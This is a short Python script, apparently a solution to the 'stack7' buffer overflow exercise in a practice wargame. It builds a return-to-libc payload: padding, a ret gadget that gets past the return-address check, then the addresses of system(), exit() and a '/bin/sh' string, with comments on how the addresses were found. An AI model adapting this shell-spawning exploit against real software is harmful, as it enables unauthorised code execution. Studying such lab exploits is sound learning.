import string
import struct

alphabet = string.ascii_uppercase
padding = ""

for char in alphabet:
        if char == 'T': # overflow at U
                padding += (char*4)
                break
        else:
                padding += (char*4)

system = struct.pack('I', 0xb7ecffb0) # found using `info address system` or `p system` in gdb
sh = struct.pack('I', 0xb7fb63bf) # libc starts at 0xb7e97000 + 11f3bf (/bin/sh offset)
ret = struct.pack('I', 0x08048544)                                                              # find with strings $
exit = struct.pack('I', 0xb7ec60c0)
payload = padding + ret + system + exit + sh # exit is where the program will return after system call
# first the command we execute is pushed to the stack, then our return address, then our arguments
# here in stack7 it no longer only checks if ret is on the stack, but it checks if the ret addr starts
# with a b (our gadget from stack6 does) so to bypass this we can just return to a ret instruction
# already present (0x08048544) and it passes the check and moves on to our system call

print payload
